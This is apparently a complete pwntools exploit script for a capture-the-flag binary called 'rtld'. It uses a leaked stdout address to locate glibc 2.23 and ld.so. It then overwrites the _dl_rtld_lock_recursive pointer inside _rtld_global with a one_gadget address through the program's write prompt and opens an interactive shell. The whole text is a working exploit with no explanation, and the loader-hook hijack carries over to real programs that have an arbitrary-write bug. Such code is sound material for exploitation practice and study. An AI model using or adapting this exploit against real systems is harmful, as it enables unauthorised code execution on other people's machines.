#!/usr/bin/env python3

from pwn import *

exe = ELF("./rtld_patched")
libc = ELF("./libc-2.23.so")
ld = ELF("./ld-2.23.so")

context.binary = exe
p = process()
#gdb.attach(p,gdbscript='''
#           brva 0x0000000000000B9D
#           ''')

p.recvuntil("stdout: ")

stdout = int(p.recvuntil("\n"), 16)
libc_base = stdout - libc.symbols['_IO_2_1_stdout_']
ld_base = libc_base + 0x3ca000


rtld_global = ld_base + ld.symbols['_rtld_global']
dl_load_lock = rtld_global + 2312
dl_rtld_lock_recursive = rtld_global + 3848

one_shot_gadget = libc_base + 0xf1247

get_shell = exe.symbols["get_shell"] 
input()
p.sendlineafter("addr: ", str(dl_rtld_lock_recursive))
input()
p.sendlineafter("value: ", str(one_shot_gadget))

p.interactive()
